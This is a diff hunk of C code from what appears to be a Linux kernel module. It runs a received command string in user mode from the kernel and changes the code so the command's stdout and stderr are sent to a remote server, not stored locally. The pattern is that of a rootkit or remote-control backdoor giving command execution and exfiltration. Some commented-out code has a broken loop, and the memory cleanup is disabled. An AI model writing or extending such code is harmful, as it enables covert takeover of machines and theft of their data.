@@ -107,28 +107,54 @@ int exec_str_as_command(char *user_cmd){
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);
 
-	// Retieve stdout and stderr
-	char *stdout_content = read_file(stdout_file);
-	char *stderr_content = read_file(stderr_file);
-	if (!stdout_content || !stderr_content) {
-		if (stdout_content)
-			kfree(stdout_content);
-		if (stderr_content)
-			kfree(stderr_content);
-		kfree(cmd);
-		return -ENOENT;
-	}
+	// Send the result to the server
+	send_to_server("stdout:\n");
+	send_file_to_server(stdout_file);
+	send_to_server("stderr:\n");
+	send_file_to_server(stderr_file);
 
-	// Update the exec_result structure with the command's output and return code
-	exec_result.code = status;
-	strncpy(exec_result.std_out, stdout_content, STD_BUFFER_SIZE - 1);
-	strncpy(exec_result.std_err, stderr_content, STD_BUFFER_SIZE - 1);
-	exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0'; // Ensure null termination
-	exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0'; // Ensure null termination
+	// // Retieve stdout and stderr
+	// int stdout_size = 0;
+	// int stderr_size = 0;
+	// char *stdout_content = read_file(stdout_file, &stdout_size);
+	// char *stderr_content = read_file(stderr_file, &stderr_size);
+	// if (!stdout_content || !stderr_content) {
+	// 	if (stdout_content)
+	// 		kfree(stdout_content);
+	// 	if (stderr_content)
+	// 		kfree(stderr_content);
+	// 	kfree(cmd);
+	// 	return -ENOENT;
+	// }
 
-	// Cleanup: free memory
-	kfree(stdout_content);
-	kfree(stderr_content);
-	kfree(cmd);
+	// // Update the exec_result structure with the command's output and return code
+	// exec_result.code = status;
+
+	// // Send stdout and stderr to server STD_BUFFER_SIZE by STD_BUFFER_SIZE chars
+	// // This is to avoid sending too much data at once
+	// send_to_server("Command result :\n");
+	// send_to_server("stdout:\n");
+	// for(int i = 0; i < STD_BUFFER_SIZE; i += stdout_size - STD_BUFFER_SIZE > STD_BUFFER_SIZE ? STD_BUFFER_SIZE : stdout_size - STD_BUFFER_SIZE) {
+	// 	if (stdout_content[i] == '\0')
+	// 		break;
+	// 	send_to_server(stdout_content + i);
+	// }
+
+	// send_to_server("\nstderr:\n");
+	// for(int i = 0; i < STD_BUFFER_SIZE; i += stderr_size - STD_BUFFER_SIZE > STD_BUFFER_SIZE ? STD_BUFFER_SIZE : stderr_size - STD_BUFFER_SIZE) {
+	// 	if (stderr_content[i] == '\0')
+	// 		break;
+	// 	send_to_server(stderr_content + i);
+	// }
+
+	// strncpy(exec_result.std_out, stdout_content, STD_BUFFER_SIZE - 1);
+	// strncpy(exec_result.std_err, stderr_content, STD_BUFFER_SIZE - 1);
+	// exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0';
+	// exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0';
+
+	// // Cleanup: free memory
+	// kfree(stdout_content);
+	// kfree(stderr_content);
+	// kfree(cmd);
 	return SUCCESS;
 }
